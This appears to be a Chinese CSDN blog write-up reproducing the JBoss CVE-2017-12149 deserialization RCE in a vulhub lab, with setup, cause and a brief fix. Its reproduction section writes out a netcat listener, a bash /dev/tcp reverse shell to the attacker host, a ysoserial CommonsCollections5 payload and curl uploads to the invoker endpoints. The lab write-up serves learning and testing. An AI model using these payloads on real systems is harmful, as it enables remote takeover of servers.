{"blogid": "126632995", "writerAge": "码龄2年", "writerBlogNum": "173", "writerCollect": "3220", "writerComment": "2317", "writerFan": "18614", "writerGrade": "6级", "writerIntegral": "7075", "writerName": "_PowerShell", "writerProfileAdress": "writer_image\\profile_126632995.jpg", "writerRankTotal": "1894", "writerRankWeekly": "57", "writerThumb": "2045", "writerVisitNum": "365008", "blog_read_count": "417", "blog_time": "于 2022-08-31 22:08:20 发布", "blog_title": "[ vulhub漏洞复现篇 ] JBOSS AS 5.x/6.x反序列化远程代码执行漏洞CVE-2017-12149", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<blockquote>\n<h1><a id=\"__0\"></a>🍬 博主介绍</h1>\n<p>👨‍🎓 博主介绍：大家好，我是 <a href=\"https://blog.csdn.net/qq_51577576\">_PowerShell</a> ，很高兴认识大家~<br/> ✨主攻领域：【渗透领域】【数据通信】 【通讯安全】 【web安全】【面试分析】<br/> 🎉点赞➕评论➕收藏 == 养成习惯（一键三连）😋<br/> 🎉欢迎关注💗一起学习👍一起讨论⭐️一起进步📝文末有彩蛋<br/> 🙏作者水平有限，欢迎各位大佬指点，相互学习进步！</p>\n</blockquote>\n<p></p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><a href=\"#__0\">🍬 博主介绍</a></li><li><a href=\"#_8\">一、漏洞编号</a></li><li><a href=\"#_12\">二、影响范围</a></li><li><a href=\"#JBossAS_17\">三、JBoss-AS指纹信息</a></li><li><a href=\"#_31\">四、漏洞描述</a></li><li><a href=\"#_33\">五、环境搭建</a></li><li><ul><li><a href=\"#1_CVE201712149_34\">1. 进入CVE-2017-12149环境</a></li><li><a href=\"#2_CVE201712149_40\">2. 启动CVE-2017-12149环境</a></li><li><a href=\"#3_CVE201712149_47\">3. 查看CVE-2017-12149环境</a></li><li><a href=\"#4_CVE201712149_54\">4. 访问CVE-2017-12149环境</a></li><li><a href=\"#5_CVE201712149_61\">5. 查看CVE-2017-12149提示信息</a></li><li><a href=\"#6_CVE201712149_67\">6. 关闭CVE-2017-12149环境</a></li></ul>\n</li><li><a href=\"#_76\">六、漏洞复现</a></li><li><ul><li><a href=\"#1__77\">1. 环境</a></li><li><a href=\"#2_Getshell_1_81\">2. Getshell 1</a></li><li><ul><li><a href=\"#_83\">攻击机监听</a></li><li><a href=\"#_89\">靶机连接</a></li><li><ul><li><a href=\"#_94\">进行编码</a></li><li><a href=\"#ser_99\">构建.ser文件</a></li><li><a href=\"#ser_114\">上传生成的ser文件</a></li></ul>\n</li><li><a href=\"#Getshell_122\">Getshell成功</a></li></ul>\n</li><li><a href=\"#3_Getshell_2_127\">3. Getshell 2</a></li><li><ul><li><a href=\"#_129\">攻击机监听</a></li><li><a href=\"#_135\">靶机连接</a></li><li><a href=\"#Getshell_143\">Getshell成功</a></li></ul>\n</li><li><a href=\"#4__146\">4. 一键利用</a></li><li><ul><li><a href=\"#_151\">检测漏洞是否存在</a></li><li><a href=\"#_159\">执行任意命令</a></li></ul>\n</li></ul>\n</li><li><a href=\"#_167\">七、漏洞修复</a></li><li><a href=\"#_170\">八、相关资源</a></li></ul>\n</div>\n<p></p>\n<h1><a id=\"_8\"></a>一、漏洞编号</h1>\n<pre><code class=\"prism language-bash\">CVE-2017-12149\n</code></pre>\n<h1><a id=\"_12\"></a>二、影响范围</h1>\n<pre><code class=\"prism language-bash\">Jboss AS <span class=\"token number\">5</span>.x\nJbossAS <span class=\"token number\">6</span>.x\n</code></pre>\n<h1><a id=\"JBossAS_17\"></a>三、JBoss-AS指纹信息</h1>\n<pre><code class=\"prism language-bash\"><span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"body_contains\"</span>,\n\t<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"manage this jboss as instance\"</span><span class=\"token punctuation\">}</span>,\n\n<span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"title_contains\"</span>,\n\t<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"welcome to jboss as\"</span><span class=\"token punctuation\">}</span>,\n\n<span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"header_contains\"</span>,\n<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"jbossas\"</span><span class=\"token punctuation\">}</span>,\n\n<span class=\"token punctuation\">{<!-- --></span>\t<span class=\"token string\">\"match\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"banner_contains\"</span>,\n\t<span class=\"token string\">\"content\"</span><span class=\"token builtin class-name\">:</span> <span class=\"token string\">\"jbossas\"</span><span class=\"token punctuation\">}</span>\n</code></pre>\n<h1><a id=\"_31\"></a>四、漏洞描述</h1>\n<blockquote>\n<p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>\n</blockquote>\n<h1><a id=\"_33\"></a>五、环境搭建</h1>\n<h2><a id=\"1_CVE201712149_34\"></a>1. 进入CVE-2017-12149环境</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token builtin class-name\">cd</span> vulhub/jboss/CVE-2017-12149\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\11849594ca7441e78b237ad107fa5d51.png\"/></p>\n<h2><a id=\"2_CVE201712149_40\"></a>2. 启动CVE-2017-12149环境</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> up -d\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\85c7148ebf784c64a56f45ef505a3a2e.png\"/></p>\n<h2><a id=\"3_CVE201712149_47\"></a>3. 查看CVE-2017-12149环境</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> <span class=\"token function\">ps</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\060eed74803a4a1a9e2ca77352e36966.png\"/></p>\n<h2><a id=\"4_CVE201712149_54\"></a>4. 访问CVE-2017-12149环境</h2>\n<pre><code class=\"prism language-bash\">http://you-ip:8080\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\d247603649eb4262a98e4f4aa04e6dc8.png\"/></p>\n<h2><a id=\"5_CVE201712149_61\"></a>5. 查看CVE-2017-12149提示信息</h2>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">cat</span> README.md\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\358499526361436297c74d96e3f13e05.png\"/></p>\n<h2><a id=\"6_CVE201712149_67\"></a>6. 关闭CVE-2017-12149环境</h2>\n<blockquote>\n<p>使用完成记得关闭环境</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">docker-compose</span> down\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\848a871b50e0479e8a8e9e536d618d4c.png\"/></p>\n<h1><a id=\"_76\"></a>六、漏洞复现</h1>\n<h2><a id=\"1__77\"></a>1. 环境</h2>\n<blockquote>\n<p>靶机：kali：192.168.13.131<br/> 攻击机：windows：192.168.192.1</p>\n</blockquote>\n<h2><a id=\"2_Getshell_1_81\"></a>2. Getshell 1</h2>\n<blockquote>\n<p>只需要构造带有需要执行Payload的ser文件，然后使用curl将二进制文件提交至目标服务器的invoker/JMXInvokerServlet页面中，即可执行Payload中指定的命令，获取对电脑的控制权</p>\n</blockquote>\n<h3><a id=\"_83\"></a>攻击机监听</h3>\n<pre><code class=\"prism language-bash\">.<span class=\"token punctuation\">\\</span>nc.exe -lvvp <span class=\"token number\">55555</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\7a29164bc25f4ea391f50d6d7a262ee3.png\"/></p>\n<h3><a id=\"_89\"></a>靶机连接</h3>\n<blockquote>\n<p>连接命令</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">bash</span> -i <span class=\"token operator\">&gt;&amp;</span>/dev/tcp/192.168.192.1/55555 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>&gt;</span><span class=\"token file-descriptor important\">&amp;1</span>\n</code></pre>\n<h4><a id=\"_94\"></a>进行编码</h4>\n<pre><code class=\"prism language-bash\">https://www.loadcaps.com/runtime-exec-payloads/<span class=\"token comment\">#java-lang-Runtime-exec</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\81fedb3f42d44017b3a34cb752cb793b.png\"/></p>\n<h4><a id=\"ser_99\"></a>构建.ser文件</h4>\n<blockquote>\n<p>利用ysoserial-all.jar工具构建.ser文件<br/> ysoserial-all.jar工具下载地址：</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">https://github.com/frohoff/ysoserial\n</code></pre>\n<blockquote>\n<p>利用ysoserial.jar包的CommonsCollections5链把要执行的反弹shell生成一个ser文件</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">java -jar /root/Desktop/ysoserial-all.jar CommonsCollections5 <span class=\"token string\">\"bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguMTkyLjEvNTU1NTUgMD4mMQ==}|{base64,-d}|{bash,-i}\"</span><span class=\"token operator\">&gt;</span>poc.ser\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\79854059b5c1449788a631bd1754e2ce.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\240a4bd2d5e54b839ed92df097aaf68f.png\"/></p>\n<h4><a id=\"ser_114\"></a>上传生成的ser文件</h4>\n<blockquote>\n<p>使用curl命令上传生成的ser文件<br/> curl对invoker/JMXInvokerServlet目录使用post请求上传生成的ser</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">curl</span> http://192.168.13.131:8080/invoker/JMXInvokerServlet --data-binary @poc.ser\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\a157dcc6de69472f8c9dc70d782195a6.png\"/></p>\n<h3><a id=\"Getshell_122\"></a>Getshell成功</h3>\n<p>执行ls<br/> <img alt=\"在这里插入图片描述\" src=\"image\\8e16c8be221f4e89bec80525b2aa0b0f.png\"/></p>\n<h2><a id=\"3_Getshell_2_127\"></a>3. Getshell 2</h2>\n<blockquote>\n<p>只需要构造带有需要执行Payload的ser文件，然后使用curl将二进制文件提交至目标服务器的invoker/readonly页面中，即可执行Payload中指定的命令，获取对电脑的控制权</p>\n</blockquote>\n<h3><a id=\"_129\"></a>攻击机监听</h3>\n<pre><code class=\"prism language-bash\">.<span class=\"token punctuation\">\\</span>nc.exe -lvvp <span class=\"token number\">55555</span>\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\fea0575b44ca40bfadfe4071c18e2171.png\"/></p>\n<h3><a id=\"_135\"></a>靶机连接</h3>\n<blockquote>\n<p>curl对/invoker/readonly目录使用post请求上传生成的ser<br/> 不知道poc.ser怎么来的可以看上面的getshell 1</p>\n</blockquote>\n<pre><code class=\"prism language-bash\"><span class=\"token function\">curl</span> http://192.168.13.131:8080/invoker/readonly --data-binary @poc.ser\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\10161d85a27c440bb281fe435bb28868.png\"/></p>\n<h3><a id=\"Getshell_143\"></a>Getshell成功</h3>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\11f527e5dace47d6bda8f811c72b252c.png\"/></p>\n<h2><a id=\"4__146\"></a>4. 一键利用</h2>\n<blockquote>\n<p>jboss-_CVE-2017-12149工具下载地址 :</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">https://github.com/yunxu1/jboss-_CVE-2017-12149\n</code></pre>\n<h3><a id=\"_151\"></a>检测漏洞是否存在</h3>\n<blockquote>\n<p>直接输入目标进行检测</p>\n</blockquote>\n<pre><code class=\"prism language-bash\">http://192.168.13.131:8080\n</code></pre>\n<blockquote>\n<p>提示存在漏洞，系统是linux的<br/> <img alt=\"在这里插入图片描述\" src=\"image\\4a46693fea82448cb434293cb477b570.png\"/></p>\n</blockquote>\n<h3><a id=\"_159\"></a>执行任意命令</h3>\n<blockquote>\n<p>输入需要执行的命令进行实现</p>\n</blockquote>\n<p><img alt=\"在这里插入图片描述\" src=\"image\\968c708a73a7453289f5865b9aaf449f.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"image\\b430b2e8042f4e52859ea1f6e5be8670.png\"/></p>\n<h1><a id=\"_167\"></a>七、漏洞修复</h1>\n<blockquote>\n<p>1、不需要 http-invoker.sar 组件的用户可直接删除此组件。<br/> 2、添加如下代码至 http-invoker.sar 下 web.xml 的 security-constraint 标签中，对 http invoker 组件进行访问控制：/*</p>\n</blockquote>\n<h1><a id=\"_170\"></a>八、相关资源</h1>\n<p>docker 搭建 vulhub 靶场环境：</p>\n<pre><code class=\"prism language-bash\">https://blog.csdn.net/qq_51577576/article/details/125048165\n</code></pre>\n<p>反弹shell的集中常见方式（一）nc反弹shell</p>\n<pre><code class=\"prism language-bash\">https://blog.csdn.net/qq_51577576/article/details/126128251\n</code></pre>\n<p>exec编码工具：</p>\n<pre><code class=\"prism language-bash\">https://www.loadcaps.com/runtime-exec-payloads/<span class=\"token comment\">#java-lang-Runtime-exec</span>\n</code></pre>\n<p>jboss-_CVE-2017-12149一键利用工具：</p>\n<pre><code class=\"prism language-bash\">https://github.com/yunxu1/jboss-_CVE-2017-12149\n</code></pre>\n<p>ysoserial-all.jar工具：</p>\n<pre><code class=\"prism language-bash\">https://github.com/frohoff/ysoserial\n</code></pre>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}